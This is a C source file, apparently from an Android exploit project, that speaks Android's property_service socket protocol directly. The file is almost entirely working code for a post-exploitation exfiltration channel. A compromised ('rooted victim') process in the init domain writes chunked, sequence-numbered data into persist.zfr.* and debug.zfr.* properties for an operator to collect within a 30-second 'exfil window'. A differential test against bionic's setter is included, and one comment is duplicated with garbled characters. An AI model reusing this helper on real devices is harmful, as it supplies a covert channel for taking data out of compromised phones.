/* ?119: raw client for Android's property_service.
 *
 * Why not setprop/__system_property_set: the rooted victim runs in the `init`
 * domain and CANNOT exec anything (measured: the probe's shell child never
 * appeared), so the only way for it to report is to speak the protocol itself.
 *
 * Protocol (as recorded in STATUS ?118.3/?118.6, semantics to be MEASURED by the
 * differential test below - never assumed):
 *   [u32 cmd = PROP_MSG_SETPROP2][u32 name_len][name][u32 value_len][value]
 *   then read a u32 response code.
 *
 * ?106-style discipline: one short connection per chunk, SO_RCVTIMEO on the
 * reply, and a failed chunk is skipped (the victim's 30 s exfil window is a
 * scarce resource; MAGIC <seq> <total> in each value exposes the gap instead).
 */
#include "common.h"
#include <sys/socket.h>
#include <sys/un.h>
#include <sys/system_properties.h>

#define PROP_MSG_SETPROP2 0x00020001u
/* Android's property value limit is 92 bytes - the reason the protocol is
   chunked at all (§118.3). */
#define PROP_CHUNK_MAX 92
/* Android's property value limit is 92 bytes - the reason the protocol is
   chunked at all (?118.3). */


static int prop_connect(void) {
  int fd = socket(AF_UNIX, SOCK_STREAM, 0);
  if (fd < 0) {
    return -1;
  }
  struct sockaddr_un sa;
  memset(&sa, 0, sizeof(sa));
  sa.sun_family = AF_UNIX;
  /* Android exposes it as an ABSTRACT socket named "property_service"; some
     builds also have the filesystem node.  Try the abstract name first. */
  sa.sun_path[0] = '\0';
  strcpy(sa.sun_path + 1, "property_service");
  if (connect(fd, (struct sockaddr *)&sa,
              (socklen_t)(sizeof(sa.sun_family) + 1 + strlen("property_service"))) != 0) {
    /* fall back to the filesystem socket */
    memset(&sa, 0, sizeof(sa));
    sa.sun_family = AF_UNIX;
    strcpy(sa.sun_path, "/dev/socket/property_service");
    if (connect(fd, (struct sockaddr *)&sa, sizeof(sa)) != 0) {
      close(fd);
      return -1;
    }
  }
  return fd;
}

/* returns the service's u32 response code, or -errno on transport failure */
int prop_raw_set(const char *name, const char *value) {
  uint32_t cmd = PROP_MSG_SETPROP2;
  uint32_t nlen = (uint32_t)strlen(name);
  uint32_t vlen = (uint32_t)strlen(value);
  int fd = prop_connect();
  if (fd < 0) {
    return -errno;
  }
  struct timeval tv = {.tv_sec = 2, .tv_usec = 0};
  setsockopt(fd, SOL_SOCKET, SO_RCVTIMEO, &tv, sizeof(tv));
  setsockopt(fd, SOL_SOCKET, SO_SNDTIMEO, &tv, sizeof(tv));
  char buf[512];
  size_t o = 0;
  memcpy(buf + o, &cmd, 4);        o += 4;
  memcpy(buf + o, &nlen, 4);       o += 4;
  memcpy(buf + o, name, nlen);     o += nlen;
  memcpy(buf + o, &vlen, 4);       o += 4;
  memcpy(buf + o, value, vlen);    o += vlen;
  if (write(fd, buf, o) != (ssize_t)o) {
    int e = errno;
    close(fd);
    return -e;
  }
  uint32_t resp = 0;
  ssize_t n = read(fd, &resp, sizeof(resp));
  int e = errno;
  close(fd);
  if (n != (ssize_t)sizeof(resp)) {
    return -e;
  }
  return (int)resp;
}

/* ?119.3 dual channel.  `persist.*` survives a sysrq-b; `debug.*` does not, but
   it is readable by the operator IMMEDIATELY (inside the victim's 30 s window)
   even if the init domain turns out to be denied `persist.*`.  These are two
   different collection moments, not a fallback pair - so write BOTH, every
   chunk, and report both codes.  Returns 0 = persist ok, 1 = debug only,
   negative/other = both failed (the value's MAGIC <seq> <total> exposes gaps). */
int prop_chunk(int seq, int total, const char *text) {
  char value[PROP_CHUNK_MAX];
  snprintf(value, sizeof(value), "MAGIC %d %d %s", seq, total, text);
  char pn[64], dn[64];
  snprintf(pn, sizeof(pn), "persist.zfr.%d", seq);
  snprintf(dn, sizeof(dn), "debug.zfr.%d", seq);
  int pr = prop_raw_set(pn, value);
  int dr = prop_raw_set(dn, value);
  printf("PROPCHUNK %d/%d persist=%d debug=%d len=%zu\n",
         seq, total, pr, dr, strlen(value));
  fflush(stdout);
  if (pr == 0) {
    return 0;
  }
  if (dr == 0) {
    return 1;
  }
  return pr;
}

/* ?119.2 differential test: our packet vs bionic's reference implementation.
   The ORACLE IS THE REFERENCE, not our expectation (?103.2 family, protocol
   edition).  A name is only a fair comparison if both sides can attempt it;
   we try several prefixes because SELinux may allow some and deny others - the
   COMPARISON is what matters. */
static const char *kNames[] = {
  "persist.zfr.lib", "persist.zfr.raw", "debug.zfr.lib", "debug.zfr.raw",
  "zfr.raw", "zfr.lib",
};


int prop_test_main(void) {
  printf("PROPTEST: differential raw-vs-bionic on %zu names\n",
         sizeof(kNames) / sizeof(kNames[0]));
  for (size_t i = 0; i + 1 < sizeof(kNames) / sizeof(kNames[0]); i += 2) {
    const char *lib = kNames[i];
    const char *raw = kNames[i + 1];
    char v[PROP_CHUNK_MAX];
    snprintf(v, sizeof(v), "MAGIC 0 1 lib");
    errno = 0;
    int lr = __system_property_set(lib, v);
    int le = errno;
    snprintf(v, sizeof(v), "MAGIC 0 1 raw");
    errno = 0;
    int rr = prop_raw_set(raw, v);
    printf("PROPTEST: lib(%s) ret=%d errno=%d | raw(%s) ret=%d\n",
           lib, lr, le, raw, rr);
    fflush(stdout);
  }
  printf("PROPTEST: now compare with: getprop persist.zfr.lib / persist.zfr.raw\n");
  /* ?119.3 dual-channel demo (the same helper the victim will use) */
  int rc = prop_chunk(0, 1, "dual-channel-demo");
  printf("PROPTEST: prop_chunk rc=%d (0 = persist ok, 1 = debug only)\n", rc);
  fflush(stdout);
  return 0;
}
